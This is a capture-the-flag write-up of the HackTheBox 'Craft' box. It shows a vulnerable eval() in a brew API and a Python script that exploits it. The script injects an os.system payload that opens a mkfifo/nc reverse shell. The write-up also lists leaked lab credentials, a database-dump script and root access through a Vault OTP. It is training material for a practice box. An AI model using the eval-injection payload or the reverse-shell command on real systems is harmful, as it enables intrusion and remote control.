---
categories:
- CTF
layout: post
media_subpath: /assets/posts/2019-07-20-craft-hackthebox
tags:
- cve
- gogs
- hashicorp vault
title: Craft @ HackTheBox
---

Craft is a medium difficulty [box](https://www.hackthebox.eu/home/machines/profile/197).

## User

First we enumerate sub domains and find "https://gogs.craft.htb/", where we find credentials in the commit history: "dinesh:4aUh0A8PbVJxgd". In addition there is a vulnerable function in the source code, containing an eval:

```
def post(self):
    """
    Creates a new brew entry.
    """

    # make sure the ABV value is sane.
    if eval('%s > 1' % request.json['abv']):
        return "ABV must be a decimal value less than 1.0", 400
    else:
        create_brew(request.json)
        return None, 201
```

We use a custom post request to get a shell:

```
import requests
from requests.auth import HTTPBasicAuth
import json

auth = "https://api.craft.htb/api/auth/login"

r = requests.get(auth, auth=HTTPBasicAuth('dinesh', '4aUh0A8PbVJxgd'), verify=False)
token = json.loads(r.text)['token']

brew = "https://api.craft.htb/api/brew/"

r = requests.post(brew, headers={
    'X-Craft-API-Token': token,
    'Content-Type': 'application/json'
}, data=json.dumps({
    "id": 0,
    "brewer": "string",
    "name": "xct",
    "style": "xct",
    "abv": "__import__('os').system('rm /tmp/.xsh;mkfifo /tmp/.xsh;cat /tmp/.xsh|/bin/sh -li 2>&1|nc <ip> 443 > /tmp/.xsh')"
}), verify=False)
print json.loads(r.text)
```

In the apps settings in "/opt/app/craft\_api/settings.py" we find db credentials: "craft:qLGockJ6G2J75O". We now connect to the database via python and dump the tables, obtaining another set of credentials: "gilfoyle:ZEU3N8WNM2rh4T"

```
import sys
import pymysql

db_name = 'craft'
connection = pymysql.connect(host='172.20.0.4',
                             user=db_name,
                             password='qLGockJ6G2J75O',
                             db=db_name,
                             cursorclass=pymysql.cursors.DictCursor)
try:
    with connection.cursor() as cursor:
        #sql = "SELECT * FROM `user`"
        sql = f"SELECT TABLE_NAME,TABLE_SCHEMA FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA NOT LIKE 'information_schema%'"
        cursor.execute(sql)
        print(repr(cursor.fetchall()))
finally:
    connection.close()
```

Using the creds we can log into gogs as gilfoyle and find the private ssh key of gilfoyle in his repo. With this key we can log into the box as gilfoyle via ssh (the passphrase is his password we got before) and grab user.txt

## Root

We issue `vault write ssh/creds/root_otp ip=172.20.0.2` to get a ssh password for root, then use `ssh root@localhost` to connect and can grab root.txt